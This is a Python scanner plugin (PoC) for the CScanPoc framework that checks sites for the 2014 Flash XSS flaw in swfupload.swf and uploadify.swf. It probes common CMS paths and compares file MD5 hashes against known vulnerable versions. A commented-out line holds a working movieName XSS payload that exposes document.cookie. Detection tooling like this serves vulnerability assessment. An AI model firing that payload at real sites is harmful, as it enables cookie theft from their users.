# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import hashlib


class Vuln(ABVuln):
    vuln_id = 'CMS_swf_0001'  # _平台漏洞编号，留空
    name = 'CMS 通用插件swf XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-07-27'  # 漏洞公布时间
    desc = '''
        相信很多站长对swfupload.swf、uploadify.swf这样的文件不陌生，做站的时候常常看到。实际上这是一个著名的利用swf异步上传的一个插件。
        它可以很好解决异步上传、多文件异步上传的问题，很快这个插件就红遍了cms界，各大cms都使用这个swf来处理上传问题。
        但是，这个swf却是一颗含有xss问题的定时炸弹！
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=69833'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CMS通用插件swf'  # 漏洞应用名称
    product_version = 'swfupload.swf/uploadify.swf'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8c886da6-c0fd-4a7a-b31b-10de0b943c10'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-069833/
            payloads = (
                '/common/swfupload/swfupload.swf',
                '/adminsoft/js/swfupload.swf',
                '/statics/js/swfupload/swfupload.swf',
                '/images/swfupload/swfupload.swf',
                '/js/upload/swfupload/swfupload.swf',
                '/addons/theme/stv1/_static/js/swfupload/swfupload.swf',
                '/admin/kindeditor/plugins/multiimage/images/swfupload.swf',
                '/includes/js/upload.swf',
                '/js/swfupload/swfupload.swf',
                '/Plus/swfupload/swfupload/swfupload.swf',
                '/e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf',
                '/include/lib/js/uploadify/uploadify.swf',
                '/lib/swf/swfupload.swf'
            )
            md5_list = [
                '3a1c6cc728dddc258091a601f28a9c12',
                '53fef78841c3fae1ee992ae324a51620',
                '4c2fc69dc91c885837ce55d03493a5f5',
            ]
            for payload in payloads:
                self.output.info('验证路径 {}'.format(payload))
                verify_url = self.target + payload
                r = requests.get(verify_url)
                if r.status_code == 200:
                    md5_value = hashlib.md5(r.text).hexdigest()
                    if md5_value in md5_list:
                        #security_warning(arg + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}// flash xss')
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    else:
                        #debug(arg + ' **_**' + md5_value)
                        pass
                else:
                    #debug(arg + '**__**not found')
                    pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
